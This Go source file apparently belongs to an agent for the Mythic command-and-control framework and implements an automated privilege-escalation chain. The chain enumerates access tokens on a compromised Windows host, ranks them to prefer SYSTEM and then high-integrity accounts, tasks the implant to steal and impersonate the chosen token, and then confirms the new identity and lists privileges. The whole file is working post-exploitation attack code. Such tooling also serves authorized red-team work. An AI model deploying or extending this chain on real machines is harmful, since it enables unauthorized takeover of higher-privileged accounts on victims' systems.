package agentfunctions

import (
	"encoding/json"
	"fmt"
	"strings"

	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
	"github.com/MythicMeta/MythicContainer/mythicrpc"
)

// --- Auto-Escalate Subtask Chain ---
// Chain: enum-tokens → steal-token (best PID) → whoami → getprivs

type autoEscalateToken struct {
	PID       uint32 `json:"pid"`
	Process   string `json:"process"`
	User      string `json:"user"`
	Integrity string `json:"integrity"`
}

func autoEscalateEnumDone(taskData *agentstructs.PTTaskMessageAllData, subtaskData *agentstructs.PTTaskMessageAllData, groupName *agentstructs.SubtaskGroupName) agentstructs.PTTaskCompletionFunctionMessageResponse {
	response := agentstructs.PTTaskCompletionFunctionMessageResponse{
		TaskID:  taskData.Task.ID,
		Success: true,
	}

	responseText := getSubtaskResponses(subtaskData.Task.ID)
	if responseText == "" || responseText == "[]" {
		completed := true
		response.Completed = &completed
		msg := "Auto-escalate: no tokens found"
		response.Stdout = &msg
		mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
			TaskID: taskData.Task.ID, Response: []byte(msg),
		})
		return response
	}

	var tokens []autoEscalateToken
	if err := json.Unmarshal([]byte(responseText), &tokens); err != nil {
		completed := true
		response.Completed = &completed
		msg := fmt.Sprintf("Auto-escalate: failed to parse token list: %s", err.Error())
		response.Stderr = &msg
		return response
	}

	bestToken := selectBestToken(tokens, taskData.Callback.User)
	if bestToken == nil {
		completed := true
		response.Completed = &completed
		msg := fmt.Sprintf("Auto-escalate: found %d tokens but none suitable for escalation (already highest privilege or no different users)", len(tokens))
		response.Stdout = &msg
		mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
			TaskID: taskData.Task.ID, Response: []byte(msg),
		})
		return response
	}

	mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
		TaskID:   taskData.Task.ID,
		Response: []byte(fmt.Sprintf("[Step 1/4] Enumerated %d tokens. Selected: %s (PID %d, %s integrity)", len(tokens), bestToken.User, bestToken.PID, bestToken.Integrity)),
	})

	callbackFunc := "autoEscalateStealDone"
	params := fmt.Sprintf(`{"action":"impersonate","pid":%d}`, bestToken.PID)
	_, err := mythicrpc.SendMythicRPCTaskCreateSubtask(
		mythicrpc.MythicRPCTaskCreateSubtaskMessage{
			TaskID:                  taskData.Task.ID,
			SubtaskCallbackFunction: &callbackFunc,
			CommandName:             "steal-token",
			Params:                  params,
		},
	)
	if err != nil {
		completed := true
		response.Completed = &completed
		msg := fmt.Sprintf("Auto-escalate: failed to steal token from PID %d: %s", bestToken.PID, err.Error())
		response.Stderr = &msg
		return response
	}

	return response
}

func autoEscalateStealDone(taskData *agentstructs.PTTaskMessageAllData, subtaskData *agentstructs.PTTaskMessageAllData, groupName *agentstructs.SubtaskGroupName) agentstructs.PTTaskCompletionFunctionMessageResponse {
	response := agentstructs.PTTaskCompletionFunctionMessageResponse{
		TaskID:  taskData.Task.ID,
		Success: true,
	}

	responseText := getSubtaskResponses(subtaskData.Task.ID)
	mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
		TaskID:   taskData.Task.ID,
		Response: []byte(fmt.Sprintf("[Step 2/4] Token stolen. %s", strings.TrimSpace(responseText))),
	})

	callbackFunc := "autoEscalateWhoamiDone"
	_, err := mythicrpc.SendMythicRPCTaskCreateSubtask(
		mythicrpc.MythicRPCTaskCreateSubtaskMessage{
			TaskID:                  taskData.Task.ID,
			SubtaskCallbackFunction: &callbackFunc,
			CommandName:             "whoami",
			Params:                  "{}",
		},
	)
	if err != nil {
		completed := true
		response.Completed = &completed
		msg := fmt.Sprintf("Auto-escalate: token stolen but whoami failed: %s", err.Error())
		response.Stderr = &msg
		return response
	}

	return response
}

func autoEscalateWhoamiDone(taskData *agentstructs.PTTaskMessageAllData, subtaskData *agentstructs.PTTaskMessageAllData, groupName *agentstructs.SubtaskGroupName) agentstructs.PTTaskCompletionFunctionMessageResponse {
	response := agentstructs.PTTaskCompletionFunctionMessageResponse{
		TaskID:  taskData.Task.ID,
		Success: true,
	}

	responseText := getSubtaskResponses(subtaskData.Task.ID)
	mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
		TaskID:   taskData.Task.ID,
		Response: []byte(fmt.Sprintf("[Step 3/4] Identity verified: %s", strings.TrimSpace(responseText))),
	})

	callbackFunc := "autoEscalateGetprivDone"
	_, err := mythicrpc.SendMythicRPCTaskCreateSubtask(
		mythicrpc.MythicRPCTaskCreateSubtaskMessage{
			TaskID:                  taskData.Task.ID,
			SubtaskCallbackFunction: &callbackFunc,
			CommandName:             "getprivs",
			Params:                  "{}",
		},
	)
	if err != nil {
		completed := true
		response.Completed = &completed
		msg := fmt.Sprintf("Auto-escalate: identity confirmed but getprivs failed: %s", err.Error())
		response.Stderr = &msg
		return response
	}

	return response
}

func autoEscalateGetprivDone(taskData *agentstructs.PTTaskMessageAllData, subtaskData *agentstructs.PTTaskMessageAllData, groupName *agentstructs.SubtaskGroupName) agentstructs.PTTaskCompletionFunctionMessageResponse {
	response := agentstructs.PTTaskCompletionFunctionMessageResponse{
		TaskID:  taskData.Task.ID,
		Success: true,
	}

	responseText := getSubtaskResponses(subtaskData.Task.ID)
	privCount := strings.Count(responseText, "\n")

	mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
		TaskID:   taskData.Task.ID,
		Response: []byte(fmt.Sprintf("[Step 4/4] Privileges enumerated: %d privileges available", privCount)),
	})

	summary := "=== Auto-Escalate Chain Complete ===\n"
	parentID := taskData.Task.ID
	searchResult, err := mythicrpc.SendMythicRPCTaskSearch(mythicrpc.MythicRPCTaskSearchMessage{
		TaskID:             parentID,
		SearchParentTaskID: &parentID,
	})
	if err == nil && searchResult.Success {
		for _, task := range searchResult.Tasks {
			summary += fmt.Sprintf("[%s] %s %s\n", task.Status, task.CommandName, task.DisplayParams)
		}
	}

	completed := true
	response.Completed = &completed
	response.Stdout = &summary

	mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
		TaskID: taskData.Task.ID, Response: []byte(summary),
	})

	return response
}

func selectBestToken(tokens []autoEscalateToken, currentUser string) *autoEscalateToken {
	var systemTokens, highTokens, otherTokens []*autoEscalateToken

	for i := range tokens {
		t := &tokens[i]
		if strings.EqualFold(t.User, currentUser) {
			continue
		}
		upper := strings.ToUpper(t.User)
		if strings.Contains(upper, "SYSTEM") || strings.Contains(upper, "NT AUTHORITY\\SYSTEM") {
			systemTokens = append(systemTokens, t)
		} else if strings.EqualFold(t.Integrity, "High") || strings.EqualFold(t.Integrity, "System") {
			highTokens = append(highTokens, t)
		} else {
			otherTokens = append(otherTokens, t)
		}
	}

	if len(systemTokens) > 0 {
		return systemTokens[0]
	}
	if len(highTokens) > 0 {
		return highTokens[0]
	}
	if len(otherTokens) > 0 {
		return otherTokens[0]
	}
	return nil
}
